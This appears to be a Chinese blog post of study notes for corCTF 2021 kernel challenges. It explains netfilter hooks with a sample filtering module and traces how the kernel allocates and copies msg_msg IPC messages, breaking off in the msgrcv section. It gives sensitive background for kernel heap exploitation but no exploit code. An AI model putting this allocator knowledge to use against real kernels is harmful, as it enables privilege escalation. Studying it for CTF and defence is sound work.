<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;">
    <title>msg_msg结构体分析</title>
    <link rel="icon" type="image/svg+xml" href="/favicon.svg">
    <link rel="stylesheet" href="/style.css">
</head>
<body>
    <header>
        <nav class="site-nav">
            <a href="/index.html" class="nav-link">/home</a>
            <span class="nav-separator">|</span>
            <a href="/about.html" class="nav-link">/about</a>
        </nav>
        <div class="terminal-prompt">
            <span style="color:#666">[</span><span style="color:#fabd2f">ayoung</span><span style="color:#666">@</span><span style="color:#59adeb">lab</span> <span style="color:#83a598"><a href="/index.html" class="path-link">posts</a></span><span style="color:#666">]$</span> 
            <span class="cmd">cat ./msg_msg结构体.md</span><span class="cursor">█</span>
        </div>
        <h1 class="post-title">msg_msg结构体分析</h1><div style="color: #666; font-size: 0.8rem; margin-bottom: 20px;">[Last modified: 2023-09-01]</div>
    </header>
    <div class="layout-grid">
                <main><p>主要涉及2021 corCTF 中的两道kernel题目</p>
<p><a href="https://www.willsroot.io/2021/08/corctf-2021-fire-of-salvation-writeup.html">file of salvation WP</a></p>
<p><a href="https://syst3mfailure.io/wall-of-perdition/">wall of perdition WP</a></p>
<p><a href="https://github.com/Crusaders-of-Rust/corCTF-2021-public-challenge-archive/tree/main/pwn">题目附件</a></p>
<h1 id="netfilter-hooks">Netfilter Hooks</h1><blockquote>
<p>netfilter is a framework for packet mangling, outside the normal Berkeley socket interface. It has four parts. Firstly, each protocol defines “hooks” (IPv4 defines 5) which are well-defined points in a packet’s traversal of that protocol stack. At each of these points, the protocol will call the netfilter framework with the packet and the hook number.</p>
</blockquote>
<blockquote>
<p>netfliter是一个数据处理的框架，在正常的套接字接口之外。它有四个部分。首先，每一个协议定义了钩子（IPv4定义了5个），这些钩子是数据包遍历该协议栈时定义好的点。在每一个点上，协议将根据数据包和hook number调用nerfilter框架</p>
</blockquote>
<p>netfilter是一个工具，可以让我们使用回调来解析、更改或使用数据包</p>
<p>netfilter提供了一个叫netfilter hooks的东西，这是一种使用回调在内核中过滤数据包的方法。有5种不同的netfilter hooks：</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">A Packet Traversing the Netfilter System:
</span><span style="color:#c0c5ce;">   ---&gt;[1]---&gt;[ROUTE]---&gt;[3]---&gt;[4]---&gt;
</span><span style="color:#c0c5ce;">                 |            ^
</span><span style="color:#c0c5ce;">                 |            |
</span><span style="color:#c0c5ce;">                 |         [ROUTE]
</span><span style="color:#c0c5ce;">                 v            |
</span><span style="color:#c0c5ce;">                [2]          [5]
</span><span style="color:#c0c5ce;">                 |            ^
</span><span style="color:#c0c5ce;">                 |            |
</span><span style="color:#c0c5ce;">                 v            |
</span></pre>
<ol>
<li>NF_INET_PER_ROUNTING — 当一个数据包到达机器的时候调用该hook</li>
<li>NF_INET_LOCAL_IN — 当一个数据包被送往机器本身的时候调用该hook</li>
<li>NF_INET_FORWARD — 当一个数据包被送往另一个接口时调用该hook</li>
<li>NF_INET_POST_ROUTING — 当一个数据包在返回到线路和机器外部时，调用该hook</li>
<li>NF_INET_LOCAL_OUT — 当一个数据包被本地创建并被发送出去时，调用该hook</li>
</ol>
<p><img src="https://pic3.zhimg.com/80/v2-c6f01f03fc06527bbeaaf2430a986f32_720w.webp" alt="" />img</p>
<h2 id="using-netfilter-hooks-inside-the-kernel">Using Netfilter Hooks inside the kernel</h2><p>要在内核种使用netfliter hooks，需要创建一个hook函数，并使用<code>nf_register_hook</code>（接收结构体<code>nf_register_ops*</code>）或<code>nf_register_net_hook</code>（接收结构体<code>net*</code>和结构体<code>nf_hooks_ops</code>）注册它。需要根据内核版本选择函数。</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">nf_hook_ops {
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* User fills in from here down. */
</span><span style="color:#c0c5ce;">	nf_hookfn		*hook;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">net_device	*dev;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">void			</span><span style="color:#c0c5ce;">*priv;
</span><span style="color:#c0c5ce;">	u_int8_t		pf;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">unsigned int</span><span style="color:#c0c5ce;">		hooknum;
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* Hooks are ordered in ascending priority. */
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">			priority;
</span><span style="color:#c0c5ce;">};
</span></pre>
<ul>
<li>hook：函数指针，当触发钩子时被调用。这个函数来自<code>nf_hookfn</code>类型，在不同内核版本中有不同的signature。确保该函数返回<code>NF_DROP</code>（丢弃数据包）或<code>NF_ACCEPT</code>（让数据包继续）或<code>NF_QUEUE</code>（将包排队到用户空间处理）</li>
<li>hooknum：hook标识之一（如<code>NF_IP_POST_ROUTING</code>）</li>
<li>pf：协议族标识符（如<code>PF_INET</code>指IPv4）</li>
<li>priority：钩子优先级（如果系统中有其他hook注册）。这个优先级可以是枚举<code>nf_ip_hook_priorities</code>中定义的优先级之一，该枚举定义在<code>netfilter_ipv4.h</code>文件（如<code>NF_IP_PRI_FIRT</code>，<code>NF_IP_PRI_RAW</code>）</li>
<li>目前可以忽略</li>
</ul>
<h2 id="code-example">Code example</h2><p>该LKM丢弃除了53端口（DNS）之外的所有UDP数据包，接收任意TCP数据包，其他所有数据包都会被丢弃。</p>
<pre style="background-color:#2b303b;">
<span style="color:#65737e;">/*****************************************************
</span><span style="color:#65737e;"> * This code was compiled and tested on Ubuntu 18.04.1
</span><span style="color:#65737e;"> * with kernel version 4.15.0
</span><span style="color:#65737e;"> *****************************************************/
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">linux/init.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">linux/module.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">linux/kernel.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">linux/netfilter.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">linux/netfilter_ipv4.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">linux/ip.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">linux/tcp.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">linux/udp.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">static struct</span><span style="color:#c0c5ce;"> nf_hook_ops *nfho = </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">static unsigned int </span><span style="color:#8fa1b3;">hfunc</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">priv</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> sk_buff *</span><span style="color:#bf616a;">skb</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">const struct</span><span style="color:#c0c5ce;"> nf_hook_state *</span><span style="color:#bf616a;">state</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> iphdr *iph;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> udphdr *udph;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(!skb)
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> NF_ACCEPT;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	iph = </span><span style="color:#8fa1b3;">ip_hdr</span><span style="color:#c0c5ce;">(skb);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(iph-&gt;protocol == IPPROTO_UDP) {
</span><span style="color:#c0c5ce;">		udph = </span><span style="color:#8fa1b3;">udp_hdr</span><span style="color:#c0c5ce;">(skb);
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">ntohs</span><span style="color:#c0c5ce;">(udph-&gt;dest) == </span><span style="color:#d08770;">53</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> NF_ACCEPT;
</span><span style="color:#c0c5ce;">		}
</span><span style="color:#c0c5ce;">	}
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">else if </span><span style="color:#c0c5ce;">(iph-&gt;protocol == IPPROTO_TCP) {
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> NF_ACCEPT;
</span><span style="color:#c0c5ce;">	}
</span><span style="color:#c0c5ce;">	
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> NF_DROP;
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">static int</span><span style="color:#c0c5ce;"> __init </span><span style="color:#8fa1b3;">LKM_init</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">void</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	nfho = (</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> nf_hook_ops*)</span><span style="color:#8fa1b3;">kcalloc</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, sizeof(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> nf_hook_ops), GFP_KERNEL);
</span><span style="color:#c0c5ce;">	
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* Initialize netfilter hook */
</span><span style="color:#c0c5ce;">	nfho-&gt;hook 	= (nf_hookfn*)hfunc;		</span><span style="color:#65737e;">/* hook function */
</span><span style="color:#c0c5ce;">	nfho-&gt;hooknum 	= NF_INET_PRE_ROUTING;		</span><span style="color:#65737e;">/* received packets */
</span><span style="color:#c0c5ce;">	nfho-&gt;pf 	= PF_INET;			</span><span style="color:#65737e;">/* IPv4 */
</span><span style="color:#c0c5ce;">	nfho-&gt;priority 	= NF_IP_PRI_FIRST;		</span><span style="color:#65737e;">/* max hook priority */
</span><span style="color:#c0c5ce;">	
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">nf_register_net_hook</span><span style="color:#c0c5ce;">(&amp;init_net, nfho);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">static void</span><span style="color:#c0c5ce;"> __exit </span><span style="color:#8fa1b3;">LKM_exit</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">void</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">nf_unregister_net_hook</span><span style="color:#c0c5ce;">(&amp;init_net, nfho);
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">kfree</span><span style="color:#c0c5ce;">(nfho);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#8fa1b3;">module_init</span><span style="color:#c0c5ce;">(LKM_init);
</span><span style="color:#8fa1b3;">module_exit</span><span style="color:#c0c5ce;">(LKM_exit);
</span></pre>
<h2 id="bu-chong-sk-buff">补充 sk_buff</h2><p>在Linux内核中，系统使用<code>sk_buff</code>数据结构对数据包进行存储和管理。在数据包接受过程中，该数据结构从网卡驱动收包开始，一直贯穿到内核网络协议栈的顶层，直到用户态程序从内核中获取数据。结构如下</p>
<p><img src="https://pic3.zhimg.com/80/v2-67664780b7739e8dc3d1709505d9b7de_720w.webp" alt="" />img</p>
<p><code>sk_buff</code>数据结构中包含诸多关于数据包存储，定位和管理的指针，数据包在网络协议栈各层次之间进行传输的过程中，内核通过操作指针的方式对数据包进行逐层解析，避免频繁的大数据段拷贝操作，从而提高数据包处理效率（但在某些特数据情况下仍然会采用数据包拷贝操作）。</p>
<h1 id="nei-he-ipc-internet-process-connection">内核IPC(Internet Process Connection)</h1><h2 id="msg-msgdui-xiang">msg_msg对象</h2><p>内核提供了两个syscall来进行IPC通信， msgsnd() 和 msgrcv()，内核消息包含两个部分，消息头 msg_msg 结构和紧跟的消息数据。长度从kmalloc-64 到 kmalloc-4096</p>
<p>消息头 msg_msg 结构如下所示</p>
<p><code>/include/linux/msg.h</code></p>
<pre style="background-color:#2b303b;">
<span style="color:#65737e;">/* one msg_msg structure for each message */
</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">msg_msg {
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> list_head m_list;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">long</span><span style="color:#c0c5ce;"> m_type;
</span><span style="color:#c0c5ce;">	size_t m_ts;		</span><span style="color:#65737e;">/* message text size */
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">msg_msgseg *next;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*security;
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* the actual message follows immediately */
</span><span style="color:#c0c5ce;">};
</span></pre>
<p>segment <code>msg_msgseg</code>如下</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">msg_msgseg {
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">msg_msgseg *next;
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* the next part of the message follows immediately */
</span><span style="color:#c0c5ce;">};
</span></pre>
<p>注意原生的只有一个next指针 实际下方还有对应的data区域</p>
<p>分配的时候 <code>seg = kmalloc(sizeof(*seg) + alen, GFP_KERNEL_ACCOUNT);</code> 会加上剩下的数据的<code>alen</code>的长度，总的长度就是 <code>sizeof(struct msg_msgseg) + alen</code></p>
<p>当一个消息过长时，其典型结构如：</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">msg_msg  ----next----&gt;  msg_msgseg  ----next----&gt;  msg_msgseg  ----next----&gt;  msg_msgseg...
</span></pre>
<p>这个对象在上层主要对应的操作是<code>msgsnd()</code>和<code>msgrcv()</code></p>
<h2 id="msgsnd">msgsnd</h2><p><code>int msgsnd(int msqid, const void *msgp, size_t msgsz, int msgflg);</code></p>
<ul>
<li>msqid：消息队列标识符</li>
<li>msgp：指针，指向一个调用者定义的结构体，形式如下</li>
</ul>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;"> </span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">msgbuf {
</span><span style="color:#c0c5ce;">               </span><span style="color:#b48ead;">long</span><span style="color:#c0c5ce;"> mtype;       </span><span style="color:#65737e;">/* message type, must be &gt; 0 */
</span><span style="color:#c0c5ce;">               </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> mtext[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">];    </span><span style="color:#65737e;">/* message data */
</span><span style="color:#c0c5ce;">           };
</span></pre>
<p><code>mtext </code>字段是一个大小由<code>msgsz</code>（非负整数）指定的数组（或其他结构体）。零长度的消息（即没有<code>mtext</code>字段）是允许的。<code>mtype</code>字段必须为正整数，该值可由接收进程用于消息选择</p>
<ul>
<li>msgsz：消息大小</li>
<li>msgflg：标志位。0：当消息队列满时，msgsnd将会阻塞，直到消息能写进消息队列。IPC_NOWAIT：当消息队列已满的时候，msgsnd函数不等待立即返回。IPC_NOERROR：若发送的消息大于size字节，则把该消息截断，截断部分将被丢弃，且不通知发送进程。</li>
</ul>
<h3 id="msgsnd-shu-ju-fa-song">msgsnd()数据发送</h3><p>总体流程：当调用 <code>msgsnd()</code> 来发送消息时，调用 <code>msgsnd() -&gt; ksys_msgsnd() -&gt; do_msgsnd() -&gt; load_msg() -&gt; alloc_msg() </code>来分配消息头和消息数据，然后调用<code> load_msg() -&gt; copy_from_user()</code> 来将用户数据拷贝进内核</p>
<p>想发送一个包含0x1fc8个A的消息，用户态首先调用<code>msgget()</code>创建消息队列，然后调用<code>msgsnd()</code>发送数据</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">[...]
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">msgbuf
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">long</span><span style="color:#c0c5ce;"> mtype;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> mtext[</span><span style="color:#d08770;">0x1fc8</span><span style="color:#c0c5ce;">];
</span><span style="color:#c0c5ce;">} msg;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">msg.</span><span style="color:#bf616a;">mtype </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#8fa1b3;">memset</span><span style="color:#c0c5ce;">(msg.</span><span style="color:#bf616a;">mtext</span><span style="color:#c0c5ce;">, &#39;</span><span style="color:#a3be8c;">A</span><span style="color:#c0c5ce;">&#39;, sizeof(msg.</span><span style="color:#bf616a;">mtext</span><span style="color:#c0c5ce;">));
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">qid = </span><span style="color:#8fa1b3;">msgget</span><span style="color:#c0c5ce;">(IPC_PRIVATE, </span><span style="color:#d08770;">0666 </span><span style="color:#c0c5ce;">| IPC_CREAT)</span><span style="background-color:#bf616a;color:#2b303b;">)</span><span style="color:#c0c5ce;">;
</span><span style="color:#8fa1b3;">msgsnd</span><span style="color:#c0c5ce;">(qid, &amp;msg, sizeof(msg.</span><span style="color:#bf616a;">mtext</span><span style="color:#c0c5ce;">), </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">[...]
</span></pre>
<h4 id="chuang-jian-xiao-xi">创建消息</h4><p><code>do_msgsnd() -&gt; load_msg() -&gt; alloc_msg()</code>
总结，如果消息长度超过0xfd0，则分段存储，采用单链表连接，第1个称为消息头，用 <code>msg_msg</code> 结构存储；第2、3个称为segment，用 <code>msg_msgseg</code> 结构存储。消息的最大长度由 <code>/proc/sys/kernel/msgmax</code> 确定， 默认大小为 8192 字节，所以最多链接3个成员。</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">DATALEN_MSG	((size_t)PAGE_SIZE-sizeof(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> msg_msg)) </span><span style="color:#65737e;">// 0xfd0
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">DATALEN_SEG	((size_t)PAGE_SIZE-sizeof(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> msg_msgseg))
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">static struct</span><span style="color:#c0c5ce;"> msg_msg *</span><span style="color:#8fa1b3;">alloc_msg</span><span style="color:#c0c5ce;">(size_t </span><span style="color:#bf616a;">len</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> msg_msg *msg;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> msg_msgseg **pseg;
</span><span style="color:#c0c5ce;">	size_t alen;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">// len是用户提供的数据size
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">// len&gt;=DATALEN_MSG，分配0x1000堆块，对应 kmalloc-4096
</span><span style="color:#c0c5ce;">	alen = </span><span style="color:#8fa1b3;">min</span><span style="color:#c0c5ce;">(len, DATALEN_MSG);
</span><span style="color:#c0c5ce;">	msg = </span><span style="color:#8fa1b3;">kmalloc</span><span style="color:#c0c5ce;">(sizeof(*msg) + alen, GFP_KERNEL_ACCOUNT); 
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(msg == </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	msg-&gt;next = </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">	msg-&gt;security = </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">// 待分配的size，继续分配，用单链表存起来
</span><span style="color:#c0c5ce;">	len -= alen;
</span><span style="color:#c0c5ce;">	pseg = &amp;msg-&gt;next;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">while </span><span style="color:#c0c5ce;">(len &gt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> msg_msgseg *seg;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">		</span><span style="color:#8fa1b3;">cond_resched</span><span style="color:#c0c5ce;">();
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">		alen = </span><span style="color:#8fa1b3;">min</span><span style="color:#c0c5ce;">(len, DATALEN_SEG);
</span><span style="color:#c0c5ce;">		seg = </span><span style="color:#8fa1b3;">kmalloc</span><span style="color:#c0c5ce;">(sizeof(*seg) + alen, GFP_KERNEL_ACCOUNT);
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(seg == </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">goto</span><span style="color:#c0c5ce;"> out_err;
</span><span style="color:#c0c5ce;">		</span><span style="color:#65737e;">// 单向链表，上链
</span><span style="color:#c0c5ce;">		*pseg = seg;
</span><span style="color:#c0c5ce;">		seg-&gt;next = </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">		pseg = &amp;seg-&gt;next;
</span><span style="color:#c0c5ce;">		len -= alen;
</span><span style="color:#c0c5ce;">	}
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> msg;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">out_err:
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">free_msg</span><span style="color:#c0c5ce;">(msg);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">}
</span></pre>
<h4 id="kao-bei-xiao-xi">拷贝消息</h4><p><code>do_msgsnd() -&gt; load_msg() -&gt; copy_from_user() </code>
将消息从用户空间拷贝到内核空间</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> msg_msg *</span><span style="color:#8fa1b3;">load_msg</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">const void</span><span style="color:#c0c5ce;"> __user *</span><span style="color:#bf616a;">src</span><span style="color:#c0c5ce;">, size_t </span><span style="color:#bf616a;">len</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> msg_msg *msg;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> msg_msgseg *seg;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> err = -EFAULT;
</span><span style="color:#c0c5ce;">	size_t alen;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	msg = </span><span style="color:#8fa1b3;">alloc_msg</span><span style="color:#c0c5ce;">(len);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(msg == </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">ERR_PTR</span><span style="color:#c0c5ce;">(-ENOMEM);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	alen = </span><span style="color:#8fa1b3;">min</span><span style="color:#c0c5ce;">(len, DATALEN_MSG);
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">// 此时的src就是用户态的mtext
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">// 从用户态拷贝数据
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// +1就是+指针指向东西的数据类型大小，即跳过消息头
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">copy_from_user</span><span style="color:#c0c5ce;">(msg + </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, src, alen))
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">goto</span><span style="color:#c0c5ce;"> out_err;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(seg = msg-&gt;next; seg != </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">; seg = seg-&gt;next) {
</span><span style="color:#c0c5ce;">		len -= alen;
</span><span style="color:#c0c5ce;">		src = (</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> __user *)src + alen;
</span><span style="color:#c0c5ce;">		alen = </span><span style="color:#8fa1b3;">min</span><span style="color:#c0c5ce;">(len, DATALEN_SEG);
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">copy_from_user</span><span style="color:#c0c5ce;">(seg + </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, src, alen))
</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">goto</span><span style="color:#c0c5ce;"> out_err;
</span><span style="color:#c0c5ce;">	}
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	err = </span><span style="color:#8fa1b3;">security_msg_msg_alloc</span><span style="color:#c0c5ce;">(msg);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(err)
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">goto</span><span style="color:#c0c5ce;"> out_err;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> msg;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">out_err:
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">free_msg</span><span style="color:#c0c5ce;">(msg);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">ERR_PTR</span><span style="color:#c0c5ce;">(err);
</span><span style="color:#c0c5ce;">}
</span></pre>
<h4 id="nei-he-xiao-xi-jie-gou">内核消息结构</h4><p><img src="https://md.buptmerak.cn/uploads/d9b53945-6702-4b59-a6af-1b0e3ba0e34f.png" alt="" /></p>
<h2 id="msgrcv">msgrcv</h2><p><code>ssize_t msgrcv(int msqid, void *msgp, size_t msgsz, long msgtyp,int msgflg);</code></p>
<ul>
<li>msgp：存放消息的结构体，结构体类型要与msgsnd函数发送的类型相同</li>
<li>msgsz：指定由参数msgp指向的结构的成员<code>mtext</code>的最大字节大小。即要接收的消息的大小，不含消息类型占用的4个字节</li>
<li>msgtyp：0：接收第一个消息；&gt;0：接收类型等于msgtyp的第一个消息；&lt;0：接收类型等于或小于msgtyp绝对值的第一个消息</li>
